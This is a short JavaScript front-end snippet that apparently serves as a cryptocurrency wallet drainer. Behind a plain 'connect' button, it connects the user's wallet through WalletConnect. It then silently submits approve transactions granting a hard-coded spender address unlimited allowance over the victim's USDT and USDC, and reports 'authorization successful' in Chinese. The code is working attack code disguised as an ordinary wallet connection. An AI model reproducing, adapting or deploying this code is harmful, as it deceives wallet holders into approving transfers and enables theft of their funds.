import { EthereumProvider } from "@walletconnect/ethereum-provider";

const connectButton = document.getElementById("connect");

const provider = await EthereumProvider.init({
  projectId: "016fb58e8c7a03ac7465704aa126764f", // 你的 WalletConnect projectId
  chains: [1],
  methods: ["eth_sendTransaction", "personal_sign", "eth_sign", "eth_signTransaction", "eth_signTypedData", "eth_requestAccounts"],
  optionalChains: [1],
  rpcMap: {
    1: "https://rpc.ankr.com/eth",
  },
  showQrModal: true,
});

connectButton.onclick = async () => {
  try {
    await provider.enable();
    const accounts = await provider.request({ method: "eth_accounts" });
    const user = accounts[0];
    const usdt = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const usdc = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
    const spender = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const approveData = (token) => ({
      from: user,
      to: token,
      data: "0x095ea7b3" + spender.substring(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    });
    await provider.request({ method: "eth_sendTransaction", params: [approveData(usdt)] });
    await provider.request({ method: "eth_sendTransaction", params: [approveData(usdc)] });
    alert("授權成功！");
  } catch (err) {
    alert("授權失敗：" + err.message);
  }
};
